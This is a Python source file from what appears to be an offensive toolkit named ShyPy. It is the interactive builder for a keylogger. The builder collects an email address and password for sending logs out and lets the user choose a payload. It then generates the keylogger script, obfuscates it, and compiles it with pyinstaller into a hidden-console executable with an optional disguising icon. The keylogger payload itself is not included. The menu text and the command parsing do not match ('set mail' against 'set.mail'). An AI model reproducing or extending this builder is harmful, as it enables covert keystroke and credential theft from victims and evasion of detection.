import os
import time
import importlib

from variables.variables import *
from utils.utils import *

class KeyloggerGenerator(Utils):
    def __init__(self):
        self.mail = ""
        self.password = ""
        self.time_out = ""
        self.payload = ""

        self.shypy_module = importlib.import_module("shypy")

    def convert_to_exe(self, name, icon):
        try:
            if OS == "windows":
                icon_option = f"--icon={icon}" if icon else ""
                os.system(f"pyinstaller --onefile --hidden-import=email.mime --hidden-import=requests --hidden-import=pynput --hidden-import=win32gui \
                           --hidden-import=smtplib --hidden-import=email.mime.multipart --hidden-import=email.mime.text --hidden-import=email.mime.base \
                           --hidden-import=email --hidden-import=threading --hidden-import=pyarmor --hidden-import=pywin32 --hidden-import=tempfile --noconsole --clean {icon_option} .\\dist\\{name}")
            else:
                icon_option = f"--icon={icon}" if icon else ""
                os.system(f"pyinstaller --onefile --hidden-import=email.mime --hidden-import=requests --hidden-import=pynput --hidden-import=win32gui \
                           --hidden-import=smtplib --hidden-import=threading --hidden-import=pyarmor --hidden-import=email.mime.multipart --hidden-import=email.mime.text \
                           --hidden-import=email.mime.base --hidden-import=email --hidden-import=pywin32 --hidden-import=tempfile --noconsole {icon_option} ./dist/{name}")
        
        except Exception as e:
            self.log(f"ERROR: {str(e)}", type=4)
            
    def start(self):
        self.clear()
        print(f"""{COLOR['CYAN']}
            ╔══════════════════════════════════════════════════════════════════════════╗
            ║*                         - Keylogger Generator -                        *║
            ╠══════════════════════════════════════════════════════════════════════════╣
            ║ IMPORTANT : Outlook.com Should Be Used As The E-mail Address.            ║
            ╠═════════════════════════════════════╦════════════════════════════════════╣ 
            ║              Commands               ║            Function                ║    
            ╠═════════════════════════════════════╬════════════════════════════════════╣   
            ║ "set mail <email>"                  : Set Mail Adress.                   ║ 
            ║ "set password <password>"           : Set Mail Password.                 ║
            ║ "set timeout <time>"                : Set Time Out.                      ║ 
            ║ "set payload" <name>                : Set Payload.                       ║ 
            ║ "show payloads"                     : Showing all Payloads.              ║ 
            ║ "generate"                          : Generate a Keylogger.              ║
            ║ "back"                              : Back To Shypy.                     ║
            ╠═════════════════════════════════════╬════════════════════════════════════╣
            ║*             Payload                : {COLOR['RESET']}{self.payload}{COLOR['CYAN']}{' ' * (35 - len(self.payload))}║                                             
            ╠═════════════════════════════════════╬════════════════════════════════════╣
            ║*             E-Mail                 : {COLOR['RESET']}{self.mail}{COLOR['CYAN']}{' ' *  (35 - len(self.mail))}║
            ╠═════════════════════════════════════╬════════════════════════════════════╣
            ║*            Password                : {COLOR['RESET']}{self.password}{COLOR['CYAN']}{' ' *  (35 - len(self.password))}║
            ╠═════════════════════════════════════╬════════════════════════════════════╣
            ║*            Time Out                : {COLOR['RESET']}{self.time_out}{COLOR['CYAN']}{' ' *  (35 - len(self.time_out))}║
            ╠═════════════════════════════════════╩════════════════════════════════════╣            
            ║*                               - The ShyPy -                            *║ 
            ╚══════════════════════════════════════════════════════════════════════════╝
            \n\n""")

        answer = input(f"{COLOR['CYAN']}ShyPy >>{COLOR['RESET']} ").lower() 

        if answer.startswith("set.mail "):
            self.mail = answer.replace('set.mail ', '') 
            self.start() 

        elif answer.startswith("set.password "):
            self.password = answer.replace('set.password ', '') 
            self.start()

        elif answer.startswith("set.timeout "):
            self.time_out = answer.replace('set.timeout ', '')
            self.start()
        
        elif answer.startswith("set.payload "):
            self.payload = answer.replace('set.payload ', '') 
            self.start()
        
        elif answer == "show.payloads":
            self.list_payloads("keylogger")

        elif answer == "set.mail":
            print(f"{COLOR['YELLOW']}[!]{COLOR['RESET']} set.mail <EMAIL>")
            time.sleep(1)
            self.start()

        elif answer == "set.password":
            print(f"{COLOR['YELLOW']}[!]{COLOR['RESET']} set.password <PASSWORD>")
            time.sleep(1)
            self.start()

        elif answer == "set.timeout":
            print(f"{COLOR['YELLOW']}[!]{COLOR['RESET']} set.timeout <TIMEOUT>")
            time.sleep(1)
            self.start()


        elif answer == "generate":
            if self.payload == "":
                print(f"{COLOR['YELLOW']}[!]{COLOR['RESET']} Please Select Payload.")
                time.sleep(1)
                self.start()
            
            else:
                keylogger_name = input(f"{COLOR['GREEN']}[+]{COLOR['RESET']} The Name Of Keylogger: ") + ".py"
                keylogger_icon = input(f"{COLOR['GREEN']}[+]{COLOR['RESET']} The Icon Of Keylogger (Optional): ")
                
                self.generate(keylogger_name, self.mail, self.password, self.time_out, self.payload, "keylogger")
                self.obfuscate(keylogger_name)
                self.convert_to_exe(keylogger_name, keylogger_icon)
                self.finish(keylogger_name, "keylogger")
                
                return
            
        elif answer == "back":
            self.shypy = self.shypy_module.ShyPy()
            self.shypy.program_menu()

        else:
            print(f"{COLOR['YELLOW']}[!]{COLOR['RESET']} Invalid Option")
            time.sleep(1)
            self.start()


if __name__ == "__main__":
    k = KeyloggerGenerator()
    k.start()